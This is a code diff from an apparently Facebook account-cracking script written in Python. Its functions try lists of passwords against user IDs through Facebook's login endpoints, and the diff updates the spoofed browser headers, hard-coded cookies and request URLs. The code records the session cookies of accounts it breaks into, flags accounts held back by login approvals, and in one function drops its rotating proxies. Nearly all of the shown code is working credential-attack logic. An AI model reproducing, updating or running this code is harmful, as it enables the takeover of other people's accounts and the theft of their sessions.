@@ -1284,7 +1284,7 @@ def mbasic(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
             'viewport-width': '980',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028'
             po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1345,53 +1345,37 @@ def p(uid,pwx,tl):
             'login_source': 'comet_headerless_login',
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'datr': 'OstGZ9sw-xX6t8x0uWISu5oh',
-            'sb': 'OstGZ0x6Arcou92IF2BALgFQ',
-            'ps_l': '1',
-            'ps_n': '1',
-            'locale': 'en_GB',
-            'vpd': 'v1%3B968x491x2.200000047683716',
-            'wl_cbv': 'v2%3Bclient_version%3A2682%3Btimestamp%3A1732715348',
-            'm_pixel_ratio': '2.200000047683716',
-            'dpr': '2.418783187866211',
-            'sfau': 'AYgNkLjGTe1gHr_479HcvZEaK6GxqLaTuMXypBQ9hvnb7qibQ6qn37jS7Pq9wXjWkiXSdgM4LqQHDpkoIqARDRBmywQDcZT_fOxZArEvyUrnjJnvR8xaiNmJjPw6pIU1gPZutIoGD0lgsw3A6xMtD9kNZcQ8cuY7BuqhDlONLkSmnsFFqBmE-ZuMphawGajSEfEzIX4-h6e_fCPk896e3znjqGp-2lJ5n6rZ_jncGUYWR8b7O_-izeB5HGXKYFMRqDWkXYektFKIJmFCnTAWGuew',
-            'sfiu': 'AYhZoZTu_-72dnkHt69iesu1hMPG1AihofIn6wiVKmnKYReQ2TMtUACzmYy9GVwsp7-EKC286ynQMZNBiamaHGqOFuo7Rri-K-43MgQ5KSA4CDfAy-Wv0kWpZNIuz7PLXnAPcGXzTAguMor3PPFBGNzgpykK-TxNaC1tI2fpdXYqKVuXi5a6B4APMstc9IcD3WUu_VSyOj8PyQ5fYSA7APooXp7Iw8VFcEE6wRi9Ui_e3jB9plGLHv8ZfImFSwH49ln4Ba9AvLtk__vStSlYoy9s',
-            'fr': '0bPmdaDqTCILtVoFs.AWWodC7aGrstpwmB8K32LUUAvOY.BnRss6..AAA.0.0.BnRzQ2.AWWIRa5cCcM',
-            'wd': '891x1756',}
-            headers = {
+            headers =  {
             'Host': 'www.facebook.com',
-            'method': 'POST',
-            'path': '/login/Device-based/login/async/',
-            'scheme': 'https',
-            'content-length': '294',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
             'Accept-Encoding': 'gzip',
-            'content-Length': '{len(str(logn_data))}',
-            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
-            'dpr': '1.75',
-            'viewport-width': '980',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-full-version-list': '',
-            'sec-ch-prefers-color-scheme': 'light',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'dnt': '1',
-            'origin': 'https://www.facebook.com',
-            'referer': 'https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
-            'x-requested-with': 'mark.via.gp',
-            'sec-fetch-site': 'none',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
+            'Connection': 'keep-alive',
+            'authority': 'www.facebook.com',
+            'method': 'POST',
+            'path': '/login/device-based/login/async/',
+            'scheme': 'https',
+            'Content-Length': '{len(str(data))}',
+            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'dpr': '2.75',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+            'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"X663"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
-            'accept-encoding': 'gzip, deflate, br, zstd',
-            'accept-language': 'en-US,en;q=0.9',}
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'viewport-width': '980',
+            'Content-Type': 'application/x-www-form-urlencoded'}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100"
-            po = Session.post(url, cookies=cookies, data=data, headers=headers).text
+            po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
@@ -1441,52 +1425,41 @@ def x(uid,pwx,tl):
     sys.stdout.flush()
     try:
         for pw in pwx:
-            nip=random.choice(xvx)
-            proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
             data = {
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'email': uid,
-            'timezone': '-330',
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'lgnrnd': '101310_hgre',
-            'lgnjs': '1732385590',
-            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHP/PHAABFAJ',
-            'locale': 'bn_IN',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTczMjM4NTU5MC40MzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3MzIzODU1OTAuNDM1LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjV9XSwiMzAwMDIiOlt7InQiOjE3MzIzODU1OTAuNDM1LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3MzIzODU1OTAuNDM1LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOlsiZW4tSU4iLCJlbi1VUyIsImVuLUdCIiwiZW4iLCJoaSIsImd1IiwiYm4iXX1dLCIzMDAwNCI6W3sidCI6MTczMjM4NTU5MC40MzYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MTUwfV0sIjMwMDA1IjpbeyJ0IjoxNzMyMzg1NTkwLjQzNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp7InciOjE0NDAsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3MzIzODU1OTAuNDM2LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJkZWZhdWx0In1dLCIzMDAwOCI6W3sidCI6MTczMjM4NTU5MC40NTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6InByb21wdCJ9XSwiMzAwMTIiOlt7InQiOjE3MzIzODU1OTAuNDM4LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3MzIzODU1OTAuNDM4LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzMS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTczMjM4NTU5MC40MzgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IldpbjMyIn1dLCIzMDAxOCI6W3sidCI6MTczMjM4NTU5MC40MzksImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTczMjM4NTU5MC40NDksImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDA0MCI6W3sidCI6MTczMjM4NTU5MC40NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93ZWIuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjotMzMwfV0sIjMwMDkzIjpbeyJ0IjoxNzMyMzg1NTkwLjQ1LCJjdHgiOnsiY24iOiJodHRwczovL3dlYi5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOjB9XSwiMzAwOTQiOlt7InQiOjE3MzIzODU1OTAuNDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC4wLjAgU2FmYXJpLzUzNy4zNiJ9XSwiMzAwOTUiOlt7InQiOjE3MzIzODU1OTAuNDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6OX1dLCIzMDEwNiI6W3sidCI6MTczMjM4NTU5MC40MzIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9LHsidCI6MTczMjM4NTU5MC42MjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6dHJ1ZX1dLCIzMDEwNyI6W3sidCI6MTczMjM4NTU5MC40MzMsImN0eCI6eyJjbiI6Imh0dHBzOi8vd2ViLmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XX0=',
-            'next': 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
-            'login_source': 'login_bluebar',
-            'guid': 'f69f270c6b2517262',
-            'prefill_contact_point': '',
-            'prefill_source': 'browser_dropdown',
-            'prefill_type': 'password',
+            'login_source': 'comet_headerless_login',
+            'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
-            'datr': 'DQQ-Z3Sl1kkwp5eJPjAonnEo',
-            'sb': 'DQQ-Z2ztbMJmdxyVIlGZ0ZEN',
-            'fr': '0c3x4NhqzBoN0oJpn.AWXsHTv6Z2exT7ekG4NjTKVFgYM.BnPBZf..AAA.0.0.BnQhss.AWXHO6YrM70',
-            'wd': '995x773',}
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnR2p9.AWUDhlDC2QM',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://web.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092',
-            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',}
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Referer': 'https://www.facebook.com/',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.facebook.com',
+            'DNT': '1',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'Priority': 'u=0, i',
+            'Pragma': 'no-cache',
+            'Cache-Control': 'no-cache',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"
+            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028'
             po = Session.post(url, cookies=cookies, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
@@ -1526,6 +1499,7 @@ def x(uid,pwx,tl):
     except Exception as error:
         #print({error})
         pass
+
 
 
 def mobile(uid,pwx,tl):
